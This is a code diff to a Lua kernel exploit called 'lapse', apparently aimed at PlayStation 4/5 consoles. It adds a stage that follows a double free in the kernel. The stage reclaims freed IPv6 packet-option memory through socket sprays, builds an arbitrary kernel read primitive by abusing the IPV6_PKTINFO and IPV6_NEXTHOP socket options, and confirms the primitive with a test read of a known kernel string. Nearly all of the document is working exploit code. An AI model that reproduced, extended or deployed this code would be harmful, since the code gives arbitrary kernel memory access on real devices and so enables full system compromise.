@@ -1405,6 +1405,98 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds)
 
 end
 
+
+-- k100_addr is double freed 0x100 malloc zone address
+-- dirty_sd is the socket whose rthdr pointer is corrupt
+-- kernel_addr is the address of the "evf cv" string
+function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds)
+
+    local psd = pktopts_sds[1]
+    local tclass = memory.alloc(4)
+    local off_tclass = PLATFORM == "ps4" and 0xb0 or 0xc0
+
+    local pktopts_size = 0x100
+    local pktopts = memory.alloc(pktopts_size)
+    local rsize = build_rthdr(pktopts, pktopts_size)
+    local pktinfo_p = k100_addr + 0x10
+
+    -- pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
+    memory.write_qword(pktopts + 0x10, pktinfo_p)
+
+    dbg("overwrite main pktopts")
+    local reclaim_sd = nil
+
+    syscall.close(pktopts_sds[2])
+
+    for i=1, NUM_ALIAS do
+
+        for j=1, NUM_SDS do
+            -- if a socket doesn't have a pktopts, setting the rthdr will make one.
+            -- the new pktopts might reuse the memory instead of the rthdr.
+            -- make sure the sockets already have a pktopts before
+            memory.write_dword(pktopts + off_tclass, bit32.bor(0x4141, bit32.lshift(j, 16)))
+            set_rthdr(sds[j], pktopts, rsize)
+        end
+
+        gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
+        local marker = memory.read_dword(tclass):tonumber()
+        if bit32.band(marker, 0xffff) == 0x4141 then
+            printf("found reclaim sd at attempt: %d", i)
+            local idx = bit32.rshift(marker, 16)
+            reclaim_sd = sds[idx]
+            table.remove(sds, idx)
+            break
+        end
+    end
+
+    if reclaim_sd == nil then
+        error("failed to overwrite main pktopts")
+    end
+
+    local pktinfo_len = 0x14
+    local pktinfo = memory.alloc(pktinfo_len)
+    memory.write_qword(pktinfo, pktinfo_p)
+
+    local nhop = memory.alloc(4)
+    local read_buf = memory.alloc(8)
+
+    local function kread64(addr)
+
+        local len = 8
+        local offset = 0
+
+        while offset < len do
+
+            -- pktopts.ip6po_nhinfo = addr + offset
+            memory.write_qword(pktinfo + 8, addr + offset)
+            memory.write_byte(nhop, len - offset)
+
+            ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len)
+            syscall.getsockopt(psd, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf + offset, nhop)
+
+            local n = memory.read_byte(nhop):tonumber()
+            if n == 0 then
+                memory.write_byte(read_buf + offset, 0)
+                offset = offset + 1
+            else
+                offset = offset + n
+            end
+        end
+
+        return memory.read_qword(read_buf)
+    end
+
+    dbgf("kread64($\"evf cv\"): %s", hex(kread64(kernel_addr)))
+    local kstr = memory.read_null_terminated_string(read_buf)
+    dbgf("*(&\"evf cv\"): %s", kstr)
+
+    if kstr ~= "evf cv" then
+        error("test read of &\"evf cv\" failed")
+    end
+
+end
+
+
 function print_info()
 
     print("lapse exploit\n")
@@ -1465,6 +1557,9 @@ function kexploit()
         local pktopts_sds, dirty_sd
             = double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd_pair[1], sds)
     
+        print('\n[+] Get arbitrary kernel read/write\n');
+        make_kernel_arw(pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds)
+
     end)
 
     if err then
